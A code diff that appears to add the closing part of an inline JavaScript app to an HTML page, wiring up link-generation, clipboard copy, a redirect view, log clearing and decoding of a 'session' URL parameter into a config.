+      function initCreator() {
+        // toggle auto-mode UI
+        if (els.autoGenToggle && els.autoGenText) {
+          const sync = () => {
+            const on = Boolean(els.autoGenToggle.checked);
+            els.autoGenText.classList.toggle('hidden', !on);
+          };
+          sync();
+          els.autoGenToggle.addEventListener('change', sync);
+        }
+
+        els.generateBtn?.addEventListener('click', () => {
+          const autoOn = Boolean(els.autoGenToggle?.checked);
+
+          if (!autoOn) {
+            const link = generateSingleLocalLink();
+            if (!link) return;
+            showSingleResult(link);
+            return;
+          }
+
+          const items = generateMultiLocalLinks();
+          if (!items || items.length === 0) return;
+
+          // keep multi items for copy-all
+          window.__KING_LAST_MULTI__ = items;
+          showMultiResult(items);
+        });
+
+        els.copyBtn?.addEventListener('click', () => {
+          copyLink();
+        });
+
+        els.copyAllBtn?.addEventListener('click', () => {
+          const items = window.__KING_LAST_MULTI__ || [];
+          const text = collectAllMultiLinks(items);
+          copyTextToClipboard(text).then((ok) => {
+            if (!ok) {
+              alert('Clipboard permission denied. Copy the links manually.');
+              return;
+            }
+            const btn = els.copyAllBtn;
+            const original = btn.textContent;
+            btn.textContent = 'Copied All! ✅';
+            setTimeout(() => {
+              btn.textContent = original;
+            }, 2000);
+          });
+        });
+      }
+
+      function initRedirect() {
+        els.playBtn?.addEventListener('click', playAndRecord);
+      }
+
+      function initDashboardControls() {
+        els.clearBtn?.addEventListener('click', clearLogs);
+      }
+
+      function boot() {
+        initNavigation();
+        initCreator();
+        initRedirect();
+        initDashboardControls();
+
+        const params = new URLSearchParams(window.location.search);
+        const encoded = params.get('session');
+        if (encoded) {
+          const config = decodeConfig(decodeURIComponent(encoded));
+          if (!config) {
+            alert('Invalid session data.');
+            hideRedirectUi();
+            return;
+          }
+          showRedirectUi(config);
+          return;
+        }
+
+        setActiveSection('main-ui');
+        renderLogs();
+      }
+
+      window.App = {
+        copyLink,
+      };
+
+      boot();
+    })();
+  </script>
 </body>
 </html>
